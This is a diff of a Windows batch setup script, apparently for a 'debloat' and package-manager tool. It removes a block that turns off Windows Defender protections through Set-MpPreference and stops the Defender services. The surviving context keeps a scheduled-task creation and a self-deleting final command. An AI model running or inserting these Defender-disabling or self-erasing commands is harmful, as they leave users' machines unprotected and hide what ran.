@@ -36,24 +36,7 @@ schtasks /create ^
  /f
 
 echo LindowsPackageManager configured.
-echo Disabling Windows Defender...
-echo.
-:: Disable real-time protection
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-:: Disable cloud-based protection
-powershell -Command "Set-MpPreference -MAPSReporting Disabled"
-powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"
-:: Disable behavior monitoring
-powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
-:: Disable IOAV protection
-powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
-:: Attempt to stop Defender services
-sc stop WinDefend >nul 2>&1
-sc stop WdNisSvc >nul 2>&1
-echo.
-echo Windows Defender protections have been disabled (temporarily).
-echo A reboot may re-enable them.
-echo.
+
 
 echo Starting setup for debloat...
 setlocal
@@ -83,4 +66,5 @@ del "%ZIP_FILE%"
 echo Self Termination...
 start "" cmd /c "timeout /t 2 >nul & del \"%~f0\""
 exit
+
 
